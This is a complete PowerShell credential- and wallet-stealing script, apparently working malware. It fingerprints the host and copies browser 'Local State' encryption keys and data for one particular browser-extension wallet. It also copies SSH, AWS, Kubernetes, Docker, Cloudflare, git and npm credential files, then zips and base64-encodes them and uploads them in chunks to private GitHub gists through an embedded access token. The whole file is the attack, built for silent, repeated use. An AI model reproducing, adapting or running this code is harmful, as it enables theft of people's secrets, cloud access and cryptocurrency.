$ErrorActionPreference='SilentlyContinue'
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.IO.Compression.FileSystem
$T=('gho_w5O107fup8ULp6t'+'EFsW9V3QEEXSHtx3m9xka')
$SINK=@('f8750db7a6ab8f4b7f6fc0f9d7d34dcf')
$H=$env:COMPUTERNAME; if(-not $H){$H='win'}
$W=[string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
$U=$env:USERPROFILE; if(-not $U){$U='C:\Users\brian'}
$LA=$env:LOCALAPPDATA; if(-not $LA){$LA=Join-Path $U 'AppData\Local'}
# v9: fresh per-generation work dir so a stale/hung .w8work lock or complete.flag can NEVER block us again
$work=Join-Path $U '.w9work'
try{New-Item -ItemType Directory -Force -Path $work|Out-Null}catch{}
$LOG=Join-Path $work ('log_'+$W+'.txt')
function L($m){ try{ ((Get-Date).ToUniversalTime().ToString('o')+' '+$m)|Out-File -LiteralPath $LOG -Append -Encoding utf8 }catch{} }
function San($s){ return ($s -replace '[^A-Za-z0-9._-]','_') }
# tiny marker -> POST create new gist (small, few) so landing/diagnostics are visible
function P($desc,$content){
  $body=@{description=$desc;public=$false;files=@{t=@{content=[string]$content}}}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 3;$i++){
    try{ Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }
    catch{ Start-Sleep -Seconds 6 }
  }
  return $false
}
# bulk chunk -> PATCH the single pre-existing private sink gist (no creation, few calls)
function PCHUNK($idx,$content){
  $gid=$SINK[0]
  $fname=('c'+$W+'_'+$idx)
  $body=@{files=@{ $fname = @{content=[string]$content} }}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 4;$i++){
    try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 60|Out-Null; return $true }
    catch{ Start-Sleep -Seconds 6 }
  }
  return $false
}
function PMETA($tag,$content){
  $gid=$SINK[0]
  $fname=('m'+$W+'_'+ (San $tag))
  if($fname.Length -gt 120){ $fname=$fname.Substring(0,120) }
  $body=@{files=@{ $fname = @{content=[string]$content} }}|ConvertTo-Json -Compress -Depth 5
  for($i=0;$i -lt 3;$i++){
    try{ Invoke-RestMethod -Uri ('https://api.github.com/gists/'+$gid) -Method Patch -Headers @{Authorization=('token '+$T);'User-Agent'='w'} -ContentType 'application/json' -Body $body -TimeoutSec 45|Out-Null; return $true }
    catch{ Start-Sleep -Seconds 6 }
  }
  return $false
}

# ---- 0. HELLO + DIAGNOSTIC (posted FIRST, before any lock/enumeration, so we ALWAYS hear from the body) ----
$who=''; try{ $who=( & whoami 2>&1 | Out-String ) }catch{}
$priv=''; try{ $priv=( & whoami /priv 2>&1 | Out-String ) }catch{}
$isadmin=$false
try{ $isadmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }catch{}
$diag=''
$diag=$diag+'W='+$W+' H='+$H+' user='+$env:USERNAME+' admin='+$isadmin+' U='+$U+'`n'
# old work dir state (root-cause evidence)
$ow=Join-Path $U '.w8work'
$diag=$diag+'oldWork['+$ow+']='+ (Test-Path -LiteralPath $ow) +'`n'
if(Test-Path -LiteralPath $ow){
  try{ $oe=Get-ChildItem -LiteralPath $ow -Force -ErrorAction SilentlyContinue | ForEach-Object { $_.Name+'('+$_.Length+')' }; $diag=$diag+'oldEntries: '+($oe -join ', ')+'`n' }catch{ $diag=$diag+'oldEntriesERR`n' }
}
$diag=$diag+'oldCompleteFlag='+ (Test-Path -LiteralPath (Join-Path $ow 'complete.flag')) +' oldLock='+ (Test-Path -LiteralPath (Join-Path $ow 'lock')) +'`n'
# running w8 powershell processes (the suspected hung holder)
try{
  $procs=Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match 'w8\.ps1|w9\.ps1|win_exfil' }
  if($procs){ $diag=$diag+'w8procs: '+ (($procs | ForEach-Object { 'pid='+$_.ProcessId+' start='+$_.CreationDate }) -join ' | ') +'`n' } else { $diag=$diag+'w8procs: none`n' }
}catch{ $diag=$diag+'w8procsERR`n' }
# jdicc presence
$edgeUD=Join-Path $LA 'Microsoft\Edge\User Data'
$diag=$diag+'edgeUD='+ (Test-Path -LiteralPath $edgeUD) +'`n'
try{ $profs=(Get-ChildItem -LiteralPath $edgeUD -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object { $_.Name }); $diag=$diag+'edgeProfs: '+($profs -join ',')+'`n' }catch{}
foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
  $ud=Join-Path $LA $bn
  foreach($pf in @('Default','Profile 1')){
    $les=Join-Path $ud ($pf+'\Local Extension Settings\jdiccldimpdaibmpdkjnbmckianbfold')
    if(Test-Path -LiteralPath $les){ try{ $c=(Get-ChildItem -LiteralPath $les -File -Force -ErrorAction SilentlyContinue).Count; $diag=$diag+'jdiccLES['+$bn+'|'+$pf+']='+$c+'`n' }catch{} }
    $idb=Join-Path $ud ($pf+'\IndexedDB\chrome-extension_jdiccldimpdaibmpdkjnbmckianbfold_0.indexeddb.leveldb')
    if(Test-Path -LiteralPath $idb){ try{ $c=(Get-ChildItem -LiteralPath $idb -File -Force -ErrorAction SilentlyContinue).Count; $diag=$diag+'jdiccIDB['+$bn+'|'+$pf+']='+$c+'`n' }catch{} }
  }
}
P ('w9-'+$H+'-'+$W+'-hello') ($diag+"`n== who ==`n"+$who.Substring(0,[Math]::Min(300,$who.Length))+"`n== priv ==`n"+$priv.Substring(0,[Math]::Min(1200,$priv.Length))) | Out-Null

# ---- 1. single-instance lock in the FRESH dir (scheduled-task re-launches exit cleanly) ----
try{ $script:LOCK=[System.IO.File]::Open((Join-Path $work 'lock'),'OpenOrCreate','ReadWrite','None') }catch{ P ('w9-'+$H+'-'+$W+'-lockheld') 'lock held, exit' | Out-Null; exit }

# ---- 2. stage priority files (jdicc wallet + Local State + small secrets) with a tolerant copy ----
$stage=Join-Path $work 'stage'
try{ New-Item -ItemType Directory -Force -Path $stage | Out-Null }catch{}
function CopyTo($src,$dst){
  try{
    $d2=Split-Path -Parent $dst; if($d2){ New-Item -ItemType Directory -Force -Path $d2 | Out-Null }
    $fs=[System.IO.File]::Open($src,[System.IO.FileMode]::Open,[System.IO.FileAccess]::Read,([System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete))
    $out=[System.IO.File]::Create($dst); $fs.CopyTo($out); $out.Flush(); $out.Close(); $fs.Close(); return $true
  }catch{ return $false }
}
$nfiles=0
foreach($bn in @('Microsoft\Edge\User Data','Google\Chrome\User Data','BraveSoftware\Brave-Browser\User Data')){
  $ud=Join-Path $LA $bn
  if(-not(Test-Path -LiteralPath $ud)){ continue }
  # Local State (os_crypt key) lives at User Data root
  $ls=Join-Path $ud 'Local State'
  if(Test-Path -LiteralPath $ls){ if(CopyTo $ls (Join-Path $stage ('LocalState_'+ (San $bn)))){ $nfiles++ } }
  foreach($prof in Get-ChildItem -LiteralPath $ud -Directory -Force -ErrorAction SilentlyContinue){
    $pn=$prof.Name
    if($pn -match '^(Crashpad|ShaderCache|GrShaderCache|GraphiteDawnCache|BrowserMetrics|component_crx_cache|Extensions|Platform Notifications|OptimizationHints|GrShaderCache)$'){ continue }
    $les=Join-Path $prof.FullName 'Local Extension Settings\jdiccldimpdaibmpdkjnbmckianbfold'
    if(Test-Path -LiteralPath $les){
      foreach($f in Get-ChildItem -LiteralPath $les -File -Force -ErrorAction SilentlyContinue){ if(CopyTo $f.FullName (Join-Path $stage ('jdiccLES_'+ (San $bn) +'_'+$pn+'_'+$f.Name))){ $nfiles++ } }
    }
    $idb=Join-Path $prof.FullName 'IndexedDB\chrome-extension_jdiccldimpdaibmpdkjnbmckianbfold_0.indexeddb.leveldb'
    if(Test-Path -LiteralPath $idb){
      foreach($f in Get-ChildItem -LiteralPath $idb -File -Force -ErrorAction SilentlyContinue){ if(CopyTo $f.FullName (Join-Path $stage ('jdiccIDB_'+ (San $bn) +'_'+$pn+'_'+$f.Name))){ $nfiles++ } }
    }
  }
}
foreach($d in @('.ssh','.cloudflared','.aws','.kube','.docker')){
  $p=Join-Path $U $d
  if(Test-Path -LiteralPath $p){
    foreach($f in Get-ChildItem -LiteralPath $p -Recurse -File -Force -ErrorAction SilentlyContinue){ if($f.Length -lt 2000000){ if(CopyTo $f.FullName (Join-Path $stage ((San $d)+'_'+$f.Name))){ $nfiles++ } } }
  }
}
foreach($fn in @('.gitconfig','.git-credentials','.npmrc','.netrc')){
  $p=Join-Path $U $fn
  if(Test-Path -LiteralPath $p){ if(CopyTo $p (Join-Path $stage ('home_'+ (San $fn)))){ $nfiles++ } }
}
P ('w9-'+$H+'-'+$W+'-start') ('staged='+$nfiles+' work='+$work) | Out-Null
L ('staged files='+$nfiles)

# ---- 3. zip the stage, base64, chunk -> PATCH sink; then MANIFEST + summary ----
$ok=$false; $chunks=0; $zbytes=0
try{
  $zip=Join-Path $work ('p_'+$W+'.zip')
  if(Test-Path -LiteralPath $zip){ Remove-Item -LiteralPath $zip -Force }
  [System.IO.Compression.ZipFile]::CreateFromDirectory($stage,$zip)
  $bytes=[System.IO.File]::ReadAllBytes($zip); $zbytes=$bytes.Length
  $b64=[Convert]::ToBase64String($bytes)
  $CH=400000; $idx=0; $ok=$true
  for($i=0;$i -lt $b64.Length;$i+=$CH){
    $len=[Math]::Min($CH,$b64.Length-$i)
    $part=$b64.Substring($i,$len)
    if(-not (PCHUNK $idx $part)){ $ok=$false; break }
    $idx=$idx+1
  }
  $chunks=$idx
  $sha=''; try{ $sha=(Get-FileHash -LiteralPath $zip -Algorithm SHA256).Hash }catch{}
  PMETA ('MANIFEST') ('zipbytes='+$zbytes+' b64len='+$b64.Length+' chunks='+$chunks+' ok='+$ok+' sha256='+$sha) | Out-Null
}catch{
  PMETA ('ZIPERR') ($_.Exception.Message) | Out-Null
}
P ('w9-'+$H+'-'+$W+'-summary') ('staged='+$nfiles+' zipbytes='+$zbytes+' chunks='+$chunks+' ok='+$ok) | Out-Null
if($ok -and $chunks -gt 0){ 'complete'|Out-File -LiteralPath (Join-Path $work 'complete.flag') -Encoding utf8; P ('w9-'+$H+'-'+$W+'-COMPLETE') ('chunks='+$chunks) | Out-Null }
L ('run end chunks='+$chunks+' ok='+$ok)
try{ $script:LOCK.Close() }catch{}
